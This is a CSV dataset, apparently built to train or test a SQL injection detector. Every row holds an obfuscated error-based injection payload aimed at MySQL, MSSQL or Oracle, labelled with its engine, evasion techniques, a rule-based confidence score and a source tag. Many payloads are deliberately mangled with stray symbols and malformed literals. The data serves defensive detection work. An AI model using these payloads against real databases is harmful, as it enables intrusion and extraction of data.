payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
"1' ) /*|p D6t^*/ And (sElECt 4241)=CONveRt ( iNt, ( SeLecT>CHaR? (| 0X67 ) +cHar (* (SeLecT (SELECT 113)) ) +cHaR; ( .8x0o106 ) +char ( (sElEcT (sElEct (SELecT (SEleCT 0X6A)))) "") +ChaR {( (seLeCt (sELEct (sELect 113))) ) + ( SELECt ( caSe WheN ( .(SELeCt 0x1098)=0x0O0o0X3fd ) /ThEn chaR ( (SelecT 0x0b11b) ) ELse chaR ( (SeleCT 0X7x30) ) ENd ) ) +ChaR ( (SElECt 640) ) +chAr (] 5X7a ) /+ChAR ( (sELecT (seLEcT (selECT (SELECT 118)))) ) +CHAR ( 0o0x0O7A ) +chAR ( <(seLECt (SELECT 053)) ) )[ ) And ( 'RSPZ'$ lIKE 'RspZ",error_based,mssql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.46,rule,sqliv5_json,unknown
"0b1"" ]) ] As wxEA WHEre (sElect 0X0x34Fa) lIKe 0o14372 PROcEdURe ANalYsE (.>extRACTValue ( 0X0X4bfb,ConcAt () 0o0x0b0o5C, ([+benChMarK (&.(seleCt (selEct (sELeCt (seLEcT}0o6X4DaB95)))),Md5X5 ({ 2x4b774c75 ) \) /*Tde|\_lvMw?*/) ^ ) + ) .,0x4! ) <&& ""X+`*"" NoT=""x+`*H"" && TruE oR (seLeCT\(seLeCT (sEleCT (SeLect 0X719))))<>(SeleCt 0X719)] aND truE#oC)sLB-FfT<a?iSI:",error_based,mysql,case_variation|comment_whitespace|inline_comment|hex_string,0.44,rule,sqliv5_json,unknown
"3"" ) ) ) ^ AnD (seLEct (SeleCT (selECt (SELEct 0xcA9)))) liKE COnvERT ( INt, ( SELecT CHaR ( (SELEct (SeLECt{(SelECT 113))) ) ~+ChAr| ( (sELEct 0X71) ) +Char ( (seleCt (sEleCT 2x40)) ) +CHar ( (seLEcT 0X6A) ) +cHAR< ( 0b0o0b0B0o0X3Ed201 ) + OR faLse# ( sELECt ( CASE WHeN ( (SElEct (sElecT 0x2031)) LIke (selECt 0o10221) ) thEn ChAR ( 0x31 ) else cHAr@ ( (seLeCT 48) ) END ) ) |+ChAr ( (selECT 0Xa0x3b14)> ) +cHAr ( (select (SElECT 132)) +)( +cHAR +( (sElEct 2x76)] ) +cHAr ( '(SELecT 0x7a) )} +chaR ( (seLECT 113): ) ) ) aND ( *( \( ""eoaB"" like ""eoABM&",error_based,mssql,case_variation|function_alternative|hex_string,0.46,rule,sqliv5_json,unknown
"0o1"" aNd ExTraCtVaLUE ( (SELEct)(sELecT (seLEct/*:K9*/(selECT 8X6f2e)))),ConCaT ( 0o0x0O0B2o5c,8X5171703a0x4e, ( SeLeCt !( ELt (/*q]OA?(Select (SELECT (SELECT 2))) ,*/ 0b5X1f0E lIkE - 0X1f2E,0X1 +) ` ) ) ;,0X0b1041001107A767a71 )- _) AnD \Or FaLse OR +(sElECt 0x0) &&+ True oR FaLSE\Or faLSE oR falSe anD ""M+P""<>""m+pk""#""OkpA"" Like ""OkPa$ o{{:",error_based,mysql,case_variation|comment_whitespace|inline_comment|function_alternative,0.45,rule,sqliv5_json,string_double_quote
"2x0O0x0b0X6' ) ) AS WkYs wHERE (SElEct 0X9AE) =\(sElECT 5x9Ae) AnD^0o0X17a0b111 like CtxSyS.dRiThsx.SN [( (sELECt>(sEleCt 0x0o13643)), ( cHR ( (sElect (SElECt 0x71))/*s+j*QJN mJ*/ ) ||CHr/ ( (SEleCt (seLeCt 0X67)) ;) ||chR ( 3X50 ) ||chr ( (sELect 0X6A) )^[ OR CHR (^ 4X51 ) or ( ( SEleCT ( case wHeN% ( (selEcT (seleCt (sElect (SElect 0x422)))) liKe [3O89247 ) ThEN (SElecT 0O2) ELse 0x0 eNd ) FroM dUAL ) OR chr (~ 2O168 ) ||ChR ( (sELect 0b0X88)^ ) ||chr (. (SELECt (seLeCT (SeLeCT 18))) ) OR ChR ( 5X7A ) ||chr ( (SElect (SeLECt (sElECT (SELECT (SELECT 113))))) ) )~ ) OR FALSE aNd (sElEcT (SELEcT (SelEct (SELECT 0x1)))) ANd TRue or ""|I p"" NOT LIkE ""|I p"" Or FAlsE^ /**/ AND TRUE ANd TrUE AnD?TrUE oR fAlsE oR "" 9"" nOT likE "" 7"" or FAlSE or FaLsE anD@tRue Or false or (SELECT 0) AnD tRUe --",error_based,oracle,case_variation|comment_whitespace|inline_comment|function_alternative,0.51,rule,sqliv5_json,unknown
"1* ) _WHErE (seLect}0O0b10101110901000) = (SELECT 0o11146)\procEduRe aNalYse \( eXtRacTvalUE ({ (sElECt (sELECT 0Xb18)),cOncAT (/&\}I*/JmGDvO0x0m3%6U^*/ 0O0X0b3O5c,0x0O0b11011710110111001112010A31,. (> sELECT ( cAsE wHeN ( (SelEcT\(sELeCT (selECt 0X15d0O0))) lIKe (selecT?(sElect (sELEcT (SELEct 0O13320)))) ) \ThEN (SelECT (SELEcT (sELecT (SelEcT (seLECT (SELEcT (SELECT 1)))))))$elSE 3O0 end )/ ) ,0b0b11X0o1315A267a0X0X3d )/*<|% {pY6b*/ % ) &@,(sELEcT 0O1) <) anD tRue aNd TrUE and ""xM6x"" like ""xM2x"" && 0x776B nOT LikE (seLEct 0x1A8C) && =""aW""=""Aw"" And~TrUE AnD ""_""=""_"" AnD TRUE ANd truE aND^""f"" nOT Like ""Fe"" aND trUe AND ""`Xu"" NOT LIKE ""`xuE"" ANd TrUE and 0X1 or (select (select (selecT (SElEcT (SELECT 0xc93)))))=0Xc94 or FALSe or FALSe oR fALSeaNdtRue or faLSE --",error_based,mysql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.45,rule,sqliv5_json,unknown
"5%"" ) } ) ; , ) ?AnD (seLeCT 0X1822). liKE UTL_InaDdR.gET_hoST_adDrEsS ( CHr (\ 0x139 ) ||cHr (/ (seLect/*mh~n+)hTr:\H(ST rG*/(SELeCt[(SELECT 113))) ) or ChR ( 0B3x5o8X0fa )`?||chr ( 9x6A )/ or ChR ( 0O102 ) oR ( ;selECt '( cASE WhEN } ( (SElecT (selecT (SelEct (SElecT 4389)))) = 0X1022+ ) %THEn (sELEcT (seLect (SelECT (SELEcT (SelecT (sELEct 1)))))) ElsE (SELeCt (seLeCT_8o6)) END ) FRoM DUAL ) OR Chr ( \0x0B4XF468c ) ||ChR ($ (SElEcT (SeLect 0X5c)) ) ||CHr ( (SeLECT (sElect 0x76)) ) OR cHr ( !(select 0x0b0o7A) ) OR cHr ( (seLeCT (sElecT 198)) ) ) and<, ( ( /*B/1bw<6*/ (. ""%""=""",error_based,oracle,case_variation|comment_whitespace|inline_comment,0.51,rule,sqliv5_json,unknown
"8'AND0b0x2e4c~ liKE DbMs_utilITY.sQLId_TO_sQlhaSH ( ( Chr (: (SelECt 0x71) )} OR CHr ( (SELEcT (seLect 0x71)) ) or Chr` ( <(sELeCT 0x0O113) ) + oR cHR (( (selEcT 0X6A)+ ) oR CHR ( (SeLEcT (seLEct 0O761)) ;); OR? ( sElECT ( CASE]wheN ( 5b0o24420615522214 } Like (sELeCt (SELEct (seLECt 0x1e4b))) )~ then (seLeCt (SEleCT 0o2X8))@ELsE (seLEct (seLeCt 5x0B5)) enD ) fROM dUal }) +!OR chR; ( 0O15 )} OR cHr`(( (sELEcT 0X7B) ) Or Chr ( (sELEct 0O764)& )` Or Chr* ( 0o0X0X8a $) or CHR ( 0x2E ) ) ,} ) AND True AND True OR False#;z",error_based,oracle,case_variation|hex_string|scientific_notation,0.51,rule,sqliv5_json,string_single_quote
"1' )_ ) /**/) ;or exTrACTVaLue ( 1297,coNCAt ( 0x5c,0X0B0B0B10010101001110100001110110001111000101000001101001000010000110100111100010a71, ( SelecT ( eLt ({ (sELEcT (selEct 1297)) lIke 1299,(SElECt<0x1) ) \) )@+,0b0x717A367a0o107; )/**/ ~) And ( ( ( 'dQJq' LikE 'dQjq",error_based,mysql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.45,rule,sqliv5_json,unknown
"0o1""* && (SELEcT 3715) in '( ( ChAR ( (SELecT (sEleCt (selECT (SELect (selECt 117))))) ) +CHar `( (sElect (seLEcT (sEleCT 113))) ) +CHaR ( 0X70 ) +CHAR ( 0o0b1101010 ) +chaR ( (sELect (SEleCt (SeLeCt 113))) ), + ( sElect (/ CAse WhEn} ( 8B0o1473055476213=0Xe33 ) tHen char (/**/ 49* ) ELse cHaR ( 48 ') End ) ) +CHaR; ( (seLect (SeLecT (Select 113))) @) +chAr ( 122 ) +CHAr ( (SeLeCt (sELECT (SELECT 0x76))) ) +CHaR `( 0x0X0o7A )= +CHaR ( 113 ) ; ) )",error_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,unknown
"1, ( selEct upPER ( XMltyPe ( :CHR (% (select (sELEcT 60)) ) ||chr ( (SELECt (seLECtX))| ) or CHr ( (sElECt (SeLECt (sELecT 113))) *) or chr ( (SeLEct (sElEcT 113)) ) ||chr ( 0b0X118378 ) oR chr ( 106 ) ||cHR or (seleCt (seLeCt 0O0)) and (sELecT (sElecT 8843)) not LIKe (SELECT 2344) and trUe oR (seLeCt 0) or FaLSE OR ""6s=RU""<>""6s=RU""# ( (SElect (SeLecT 113)) ) or (_ SeLEcT ( CasE WhEn ( %0o0X3x109a liKe (SeLECt 0o11292). ) Then (sELEcT (selECt (sELEct 3))) ELsE 6O0X0 eND ) < from dUaL ) oR CHR &( (SEleCt (sELecT (seleCT 119))) +) ||cHr `( 4X7A ) ||ChR ( \0O0b0b3110117 ) _ oR cHR ( (seLeCT (SELect 122)) ) ||ChR ( (seleCt 113) ) ||ChR ( 0x3e ) ) ; ) FROm dUAL ) tWZs=",error_based,oracle,case_variation,0.51,rule,sqliv5_json,string_double_quote
5b3' ) ) and 1O0B0xeaa =`^ ( SELEcT upPeR ( xmLtype ( $cHr ( (SeLEcT (seLecT (SelecT (sElect 59)))) ); ||chR (? (SELecT (SelecT (sELect (sELECt (selECt (sElecT 0x37)))))) ) Or cHr (| 0x0x0x74].) ||chr ( (select 0b0X9B110003111) ) ||chr ( 0x0O115&]) ||cHr ( (SELECT 6x6a) )?=||CHr;/*|*/( (sELeCT (SELECt (SELeCT$0x265))) ) oR ( SELeCt ( Case WHEn ( 0X1B7x14d8BAC458=0o91062 ) - then 0B4 elSE 0B5O5 ENd ) fRom DuAl ) oR ChR '( (SeLECt (SElecT (sELeCT (sElecT?(SelECT?(SELECT (SElect (SELeCT*(SELECT 113))))))))) ) Or chR ( 0B271x7a `) ||cHr ( (Select'118) &)@ oR>cHR ( 7x39a$ )$ Or CHR ( (seleCT (SELeCt 0X201)) ) OR ChR ( (sELect (seLeCT (sELeCt (SElEct 0x3e)))) ) :?) ) From DuaL ) anD& ( ( } 'Opyp'='oPyP,error_based,oracle,case_variation|comment_whitespace|inline_comment,0.51,rule,sqliv5_json,unknown
"0X1' ) pRocEdURe ANalYse ( ExTraCtvAlUe ( (sELect@(sElECT (SELeCt (SELECT 0x267f)))),coNCAt ( 0X0x0x5c, ( BenCHMaRK? ( 4x2C4B40,md5 (' 7x52515A52 ) ) ) . !) ? ) ,(SelECT (SELeCT (SeLECT (SELECT (SELECT 1))))) ) anD ( 'SzIB' LIKE-'sZIb",error_based,mysql,case_variation|hex_string,0.45,rule,sqliv5_json,unknown
"1 ) WHerE (SeLEct (SeleCt (seLeCt 1013))) LiKe (SELecT (seLeCt 1413)) && | 0X1011 lIkE ?CONVERT ( InT, ( sELECT ChAR ( (seLEcT 0x71) ) +Char ( (SELEct 3X71) )~ +Char `( (Select (select 0x0X46)) ) +cHar \( (SEleCT (SELEct 109))+ ) +cHar? ( 0x1o107 ) + ( SElect @( Case wHen ( 0X1291 lIKe (selEct (SELECT 4201)) ) thEn cHaR ( (Select (sELEct (sElEcT 49))) {)= ElSE<chaR ( 0X9B110004 ) enD )` ) & +cHaR ( (SelECt 013) :) +chAr ( (seLect 122) )/*xA5*/ +ChAR ( (SeLecT 0X76) ) +chAr ( 0x0X0b1811010 )"" +char ( :0O0xa5 ) ) ) ? AnD :TrUE or FAlSe>AND truE oR falSe oR (SeleCt (SeLECt 0)) oR (SEleCt 8693)!=(SELECT 8693)/**/and (select 1) and TRue --",error_based,mssql,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,unknown
"0O0O9"" AND[0XEAa/LIKe ( ^seLeCt?uPPeR =( XMltypE ( cHR _( `(seleCt (seleCT (sEleCt (seleCt 0x0X0B13C)))) ) < OR CHr ;( &(SElEct 0X0X3a) ):, oR chr () 0b1110885? ) . or CHr@[( (sElEcT (seLEcT 0o0B0X263)) `)]* OR CHr ;( 0X0o120 )) ;)Or CHR ( )0b0X6A ) oR cHr ]( 0o5X71 ) ~OR ( SElECt / ( CASe;WhEn =(% (SEleCt 0O5B107111100110) LIKe; 0x3O5xEAa ) tHeN 0x1 Else (seLecT (SELecT (seLEcT (SeLecT (seLEcT 0X3)))));end ) <FRom?DUAL ) Or cHR ( 0x0b1040311 ) oR cHR ( 1X0O3A ); or chr(^( 0X0b1110130 )/*Eo/ d1 mV $M-L?tu2I)A.Xg\.MdK= */ oR Chr ( 0X3b1611010 ) OR CHR (]|(SElECt (SELect (sElECT (SeLECT 0x0o107)))) ) or( cHr ( 0O0X3e; ) ) )""],FRoM DUAL< ) ^and ""ExGR""=""eXgR",error_based,oracle,case_variation|comment_whitespace|inline_comment|hex_string,0.51,rule,sqliv5_json,string_double_quote
"5' ) ) )], ) [ aND[(SELeCT 0b4x67A4) _lIke cTXsyS.DriThsX.Sn~+( (SEleCT 1O4b1O10555228628113), ;( chR.?( (SeLECT (sEleCt 0x0b1011))! )` Or Chr ( 7O5x71 <) , Or Chr ( +(seLeCt?(SELECt (SELECt 1X5a)))>()+ oR chR *( ]0x0o6A ) OR ChR ( (sEleCt 3b0X6O109){<)) or\}( sEleCT& (\ cASe whEN ( (SELEcT;0O0X2X12a9) LIKE 0x1337%!) ' THeN[0X8 else 0X5o0x0 eNd )/*7xQy**/ FrOM dUaL![)/ OR ChR /*(seLECT (SELEct (SeLeCT (select 0X09)))))~}oo@""*OkVj/FbLUw`FWJG B@ IL6.q1|&(SELECT (SELECT (SELECT 6)))``*/( 0X0b0x50efF1 `)/*</z;]?UXdTCsa`e A ]*/ OR cHR ( ""(SElECt 0b0x0b0x0B0o148fa) ) , or CHR ?( 0x4O6x00 )! OR+ ChR ?( {0B1113010 ){ OR chR (: 0O269 < ); ) ><^) + and ?"" (? ; ( ; (~ 'qFvG' =' 'qfvg",error_based,oracle,case_variation|comment_whitespace|inline_comment|hex_string,0.51,rule,sqliv5_json,unknown
"7%"" ) ) ) AnD (sElEct 1xEAa) likE ( SElEcT uPPeR= ( xmltYpE ( Chr (] 8x6x0b0o0x8c ) oR cHr /*(HSlV%R[PbB)>pVX */( (seLeCT=1X9b16A) ) Or Chr ( 0b175X71 ) ||cHr ( }(SelEcT 5x275) ) or ChR! ( (sELECt (sEleCT (sElECt (SeLecT (SELecT (selECT 0x60)))))) ') ||CHR ( (Select 0X4A) ) [||cHR ( (seLEct (sEleCT (sEleCT (SElEct (SeleCT 0X0X47))))) ) / or ( <SelECt - ( CASE WHEn oR false oR FALse aND-(sELECt (seLeCt (select (sEleCT 0x13dE)))) <> 0xFf9 Or 'h' NoT Like 'h' Or falSe ANd TrUE AND (SElEcT (sElEct (sELeCt (selECT (SELECT 2))))) OR FALSe or FaLSe Or FaLsE oR 0X0 or ""f"" Not LIkE ""F"" Or fAlSe# ( 0XEa4 LIKE 6xeaA /*(0x0 oTw[c7*/){ thEn""0X1 elSe 0o0O0 end& ) :frOm dUal ) - Or CHr *( (SElecT (SelECT (Select (sElect (SeLECt (sELECT (SElEcT (SeLecT (SElECT 0xac))))))))) ) Or Chr ( 0x7b0o0X7a ) ] OR Chr ( (SelEcT 1X0B0X0x4c) ) ||cHr ( (SelECT (select 0x5b)), ) ||chr ( 0B1110001_ ) ||cHr ( 0o5X3e ) ~ ) ) ^ frOM DuaL &) '&& /( ( ( ""%"" LIke\""IXn0VY5 ""LkQfJIr",error_based,oracle,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.51,rule,sqliv5_json,unknown
"4X1'+@ ( seleCt 'kiCV' WHERE 0X6b8> lIKE (seLECT (SElecT 0X0x7b8)) aNd 0xEaA lIKE ( sElECT UpPER ( xmlTypE ( CHr ( 0X3C )+ Or ChR ( 8x3A ) ||ChR ~( 0x4X43 ) Or ChR ( 0X3aF ) oR}chr ( 0x0O0o0X70 ) ||chR () 0x6A ) oR CHR ( 0X91 )<or (; SelEcT ( CasE wHen ( 0o0XEAa LIKe% 0Xeaa ) THeN 0o6 eLse (seleCT (sELEcT 0x0)) END ) from DuAL ) &||chR (> (SELecT (SeLECT (seleCT (SeLeCT 0xB7)))) ) oR ChR ;( (selEcT (SeLECT (seLect And truE and ""/r""=""/R"" OR faLSe or (SELeCt (SelECT (SELeCt (sELECt (sEleCt (sElecT 0X0)))))) or FALse || FAlsE AnD (seLecT (sEleCt 0X24B)) <> (seleCt 0x24c) oR FALsE And (sElect (SELEcT (SeLeCt 9460))) NOT LiKe (SelEcT (sELEcT 0x24F5)) Or FALsE#0X7A))): ) ~ oR cHr (?$(sElECt (SELEcT 0x6C))- )) OR CHR ( (sELECt 6x7a) ) Or CHr [(} 0X71=/) ||ChR ( 0b119110 ) ; ) )] FroM dUal ) ) +'u 8_]fw/xgM{P'eaUh+|",error_based,oracle,case_variation|hex_string,0.51,rule,sqliv5_json,string_double_quote
"1' Or < ( SEleCT 'VsFG' whEre 0xDDb=0XdC7 AND UPdaTExml ( 0X18f3,coNcAT ( 0x0X2e,0X3171708a0x46, ~( :SELEct ( ELt ( (SeLECT (sELECT (selECt (SELECT 3398)))) LIKe (SelecT (seLECT (seLect (sELEct (sElECT (SelEcT 0xd47)))))),(SelEct (SELECt (SELECT 1)))_ ) ) ?) ,0x0O0x0O1435a763A79 ) ,0X489 ) _ @) Or '",error_based,mysql,case_variation,0.45,rule,sqliv5_json,unknown
"0O1%"" ) ) and (SeLeCT 0xc0o111) lIkE$ Utl_iNADDr.GeT_hOSt_AddrEsS ( Chr ( 0xAD ) %||Chr ( (sElECT (SELEcT 0B0x0o110))[ ); or chr ( (seLECt (SELect 0B0o0x0o157)) )?< OR CHr/* /+JS?^*/ ( [0o4x6A ) ||chr ( (sELEcT%(SelEct (sELecT (selECT (seleCT 0x0o103))))) )||(\ SElecT ( CASE When ]( 0X0b0b0X2546CACeA lIKe 0O0x4B0O4B3x1407/*uwe$X<(,0XEMZ}) ANd ""S""<>""sc"" OR FALse aND tRuE OR 0o0x0 && tRUe aND True and TrUe oR 'u' NOt LiKe 'u' aNd 2x1d86 != (seLEct (SeLect (SelEct (SelEct (SELECT (SELECT (SELECT 7559))))))) oR (SeLecT 2x0) ANd-trUe aNd truE or FAlSE or 0x0#:ie`Oi m""5@mH{@*/ ) theN 0b9X1 ElSE (selEct (SElECT (SELECt (SElect (SelECt (sELecT 0x0)))))) ENd ) ~(FrOM DUAL ), or chr ( )113_ ) ||chR ( 0X0X7A :) oR cHr ( 0X0B0b1001100 ) || CHR/*z* f;oSjLY*/ ( 0x8X0O7a _) ||CHR ( (sElecT (sElEcT (SELect (select (SelEcT (seleCt (SElecT (seLECt (SelEcT 0x125))))))))) :) ) ~. And ( > () ""%""=""k~.m0m(iEl?i4.zK_yG",error_based,oracle,case_variation|comment_whitespace|inline_comment|function_alternative,0.51,rule,sqliv5_json,string_double_quote
"1 ) AND (SeLect 0X17a5):= cTXsys.driThsx.SN ( (sELeCT 6055), ( cHr ( /(seLEct (SelEcT (SELECT 110))) ) OR Chr/ ( (sElect 0X71) ) || Chr] ( 0b1X10c0x5Ce ) ||cHR ( (Select (selecT (SELECT (seLect 101)))) ) ||ChR ( (SElEct (seLECt 0X24)) ) OR ( SEleCT ( cASE WHEn ( &(SElect (sElECT 8X17C7)) lIKe (sElEct 0x17A7) ) tHEn<0O0B1 eLsE 0O0 eND ) fRom dual> ) oR cHR ( 0X6f ) or chr (/*rNE ;uDA ;<%APj(=Z*/ (sELECT (sElect 0x0B111A)) ) OR cHR ;( 0x76 ) or CHr <( 0O0X7A !) ||&chR ;( 113 ) )/**/ ) )",error_based,oracle,case_variation|comment_whitespace|inline_comment|hex_string,0.51,rule,sqliv5_json,unknown
"3%' ) ) ) ? or UPDATEXML ( (sELECT (SeLEcT (SelECT (seLECT{(sELeCt 0x16B0))))),COnCat ( /*KxF_.F>O^]' p'OE*s:ZIr('dzCL r;i\F*/0o1x0e,2X0x2D1E7Aa0O107, ( Select ( elT ( (sELeCt (SeleCt (sELECT (selecT (SelECT (seLECT (SELECT (SELECT (SELECT 1803))))))))) like /**/ 0x0X0X4b4,(selecT 0o10) )/**/ () } * ) ?,0x5x816a0XA9A0b0O0b0x47 -)?_,0X0x0b10101da <) And (? ( '%' LiKE' '",error_based,mysql,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.45,rule,sqliv5_json,unknown
"1' }) ANd&0x10a0b0B0x5` =' ctXSys.DrithSX.SN ( (SElECt (SElEcT 8x27A7)),~:( ChR ( 0o177} ) or cHR ( (sELect 0B0o4955121) ) OR cHR ( (sELecT (seLECt (SelECt (sELEcT;(sElect:912))))) ) OR Chr ( (sELect 6X0x7xC4) ) OR CHr }( 0o0x71 ) oR *( SeLECt ( +cASE When + ( (sELECT (SEleCT 6X0B10610a7)) .lIKE (sELect (SeLect/*lEjV %S)-ffls[X; SL4-d g*/(SElECt (seLecT 0X17a7)))) ) ThEn (SELeCT (seleCt[(SEleCT (SELeCt (SELeCt 3))))) else~0x0O0b0 enD ) fROM dual ) oR chR ( (Select 0o0x2c2) )< > or <chr$ ( 0x0X0X3A ) OR cHr |( 0x76 ) OR Chr ( 0o0B1011010010_ ) oR)cHr )(+ (SElEct (SEleCt (seLEcT (seLEcT 513)))) ) )/ ) ANd ( 'lVcK' LiKe +'lVcK",error_based,oracle,case_variation|comment_whitespace|inline_comment|hex_string,0.51,rule,sqliv5_json,unknown
"3%' ) .and eXtrACTvAlUE ( 0X7f0o2e,COnCAt (_ 0x5C,0x0X6D0O6E7AA0X87, (` SeLeCT ! (.)ElT (( /*(seLeCT (sELeCt (SeLECT 0x0))) t[wfan""*/(selEct (SeLect 2x0O1f2e)) ;lIke (seLEct (sELecT (sELeCt 0X0f35))),(SeleCt 0X1) ) ) ) ,0x0O1812a967A71 <) )* % And ( '%'='",error_based,mysql,case_variation|comment_whitespace|inline_comment|scientific_notation,0.45,rule,sqliv5_json,unknown
"1"" !) /*|^ s?Lb*/_aNd!(sEleCT (seLeCt 0x1122))? =- utl_InAdDr.gET_hOSt_AddReSS (@ chR]#( (seLECT (selECT (select/**/(sELeCt (SELeCT (SelEcT (SeLeCt (seleCT (sElEcT (SELECT 115)))))))))) ) . OR cHr ( (sELECt 0B0B1114101) ), ||ChR= ( 0O100 ) or chr ( 6X6a& ) or Chr ( (SELEct 0X0o1) ): or (= sELecT ?( cASE!WhEn ( 0X8x4O0O5O0o0B101101111001110 likE 0O0x3x19Aa ) Then (SeLECt (SELeCt (seLECT (SElECt 1)))) eLse 0x0}end () <}from DuAL ) @||chR ( .(SELeCT (SelECT 0X75))\ )/ || cHr )( (sEleCt 3b0x0B1181010) ) Or ChR$ ( (SeLECt (seLecT (selecT (SElECt (sElEct 0X76))))) ) ||^Chr (? (seLeCt (SELEct 0x84)) ) oR ChR ( )(SElECt 7x0o0x3A) ) ) AnD (<,""YndE"" OR ==|""ynDe",error_based,oracle,case_variation|comment_whitespace|inline_comment|hex_string,0.51,rule,sqliv5_json,string_double_quote
"0b1anD3715 IN. ({ ( cHar or falSE oR fAlsE#( (sElECt 113) ) +Char >( (SELECt 113) ) +CHar /*b;pH*/( 0X73 ) +CHar (![(SeLecT (SeLeCt 0x9a)) ) +CHAR ( 113 ) + ( SELEcT (? CaSE wHEN ( (sEleCt 0Xe86)=(SeleCT]0XBC7) ) &tHEN cHaR ""( 0x0B0B10101101781021 ) ElsE cHaR ( (sELEct 98) ) ]enD ) <) +cHAR ( (SELeCT (SELecT 113)) ) +CHAr ( (seleCt (SELEct 0o143)) ) +ChaR ( 1O0o246 ) +cHAr ( (sELEcT (SElEcT (SElecT 142)))* )} +Char (! (sElecT (SELeCt 412)) ) ) ) And (SelECt 1)/or=faLsE oR False -- knpWc0x8u5TM5_D ysR",error_based,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.8,rule,sqliv5_json,unknown
"8%' ) /*(OU?*/ ) } PRoCEDUrE~AnAlySe ( &eXtRACTVALue ( (sELeCT (SelECt (sELEcT 0o0X259B))),CoNCAt ( 0X5C, ( BENCHmARk }( 8x4DaAd0,mD5 ~( 0X4b0x306C70 ) ) ) ) ) ,(SelEct (sELeCt 9x3)) ) /oR ""S""=""sI""&&truE Or (SELECT 0) OR False#<`",error_based,mysql,case_variation|comment_whitespace|inline_comment|hex_string,0.45,rule,sqliv5_json,unknown
"0X0O0"" \ ) :) ) ? + && (SElEct (SELEcT (SELEct (sELECt (select 0X41e))))) LiKE cTxSys.drItHSx.sn ( 0B1001o83347, `( cHR ( 0o10x0B1011071 ) ||cHr ( 0X0O277 ) Or CHr ( _0X0o0B1101010 |) OR ChR (< 0X0X0x0a ) oR ChR (^ (seLEcT (seLecT (sELEcT (seLECt (SEleCT (SELEct (SELECT (SELECT 153)))))))) ) Or ( \SELEcT ( +CasE wHen ( (sELEcT$(SELecT 0X180e))=0x57a0o0x7 ); THEn (SEleCT (sElect 0x1)) ELSE 0X9 eNd ) ; frOM`DUaL "") Like or Chr ( 0x62> ) ; OR CHR ( 5O0x9a; ) || cHR ( (SElect (SeleCt (SElECt 0X0x2a2)))< ) oR cHr ( )0o0x7a ) OR CHr{ (/ (sElecT (SeLEct (SELecT 0o0X71))) ) ) ^ )+ && ( ("" %( ""fOgb"" Like ""FogB",error_based,oracle,case_variation|function_alternative|hex_string,0.51,rule,sqliv5_json,unknown
"1"" ) whERE 0X0o275A likE (seLEcT 0X206a) aNd 0x0O5142 LIkE{ uTl_inaDDr.gEt_hosT_addRess ( CHR ( (seLect (Select 113)) :) ||ChR (! 0O0o2X0X47 ) ||cHR ( (seLECT 0Xad) ) ||chR` ( 0X0X0B184a ') ||cHr ( (SeLeCt 115) ) oR ( select ( *caSE+wheN (< (sELeCT 0x0o157d) _=- (SELECT (seLECT (selECt 7087))) )\ /ThEn (sELecT>0x1)!elSe`0X5o0X0 END ) From duaL( ) or chR^ ( 0x71 ) or (SeLeCt 0) or""faLSE aNd (SEleCT 1) or FalSE aND tRUE OR fAlsE OR 0# oR CHR ( (SELect (SeleCT$(sElecT (sELECT (SeLeCt 912))))) ) OR Chr ({ 0x0b0X0x4C ) ||chR ( (seLect 0x7a) ) OR Chr< ( (sEleCT (sELeCt (seLEct (SElEcT (SelECt/**/(sELEcT (Select (sELECT 813)))))))) ) }; ) . oR {falsE*or^0X0:oR faLSE or False or 0X0O7B0x0 oR fAlse OR FaLSe And TRue OR :falseAND0b1011001011010 like (sElEcT*(SelecT 0x125a)) AnD true Or fALsE/*;7kI)=Va!pAsk EH]l2k*/|| 0x0/**/oR FalSE Or 0x0 And (SEleCT (SELEct;(SelecT (SELECT 1)))) aND tRUe or falSE or ""8"" not LIKe ""9"" AND True AnD"""" ""="" "":OR (SelECt 0) --G}BQ$pAgPnoMw+",error_based,oracle,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.51,rule,sqliv5_json,string_double_quote
